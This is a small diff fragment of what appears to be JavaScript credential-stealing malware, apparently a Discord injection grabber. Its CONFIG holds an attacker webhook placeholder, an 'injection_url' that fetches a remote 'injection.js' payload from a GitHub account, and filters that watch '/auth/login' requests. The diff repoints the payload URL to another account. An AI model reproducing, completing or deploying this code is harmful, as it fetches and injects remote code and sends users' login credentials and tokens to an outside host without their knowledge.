@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/Chaosxz4117/dinjection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/keyosbuff//dinjection/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
